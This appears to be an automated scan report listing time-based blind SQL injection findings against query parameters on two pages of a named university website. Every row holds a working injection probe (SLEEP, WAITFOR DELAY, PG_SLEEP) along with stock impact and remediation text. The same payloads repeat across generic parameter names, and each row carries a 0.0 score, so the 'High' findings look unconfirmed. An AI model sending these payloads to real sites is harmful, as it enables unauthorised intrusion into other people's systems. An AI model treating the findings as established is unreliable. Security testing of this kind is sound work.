Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%22+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%22+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1+OR+SLEEP%285%29#1765968062881-8448b7a7-eaf1),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1+OR+SLEEP%285%29#1765968062881-8448b7a7-eaf1),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%22+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%22+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%22+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1765968062881-8448b7a7-eaf1),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1765968062881-8448b7a7-eaf1),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1765968062881-8448b7a7-eaf1),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1765968062881-8448b7a7-eaf1),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1765968062881-8448b7a7-eaf1),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1765968062881-8448b7a7-eaf1),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%27+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1+OR+SLEEP%285%29#1765968062881-8448b7a7-eaf1),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1+OR+SLEEP%285%29#1765968062881-8448b7a7-eaf1),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1+OR+SLEEP%285%29#1765968062881-8448b7a7-eaf1),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1+OR+SLEEP%285%29#1765968062881-8448b7a7-eaf1),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%27+AND+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%27+AND+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%27+AND+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%27+AND+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%27+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%27+AND+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1+OR+SLEEP%285%29#1765968062881-8448b7a7-eaf1),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%27+AND+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%27+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%27+AND+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%27+AND+SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1765968062881-8448b7a7-eaf1),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1765968062881-8448b7a7-eaf1),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
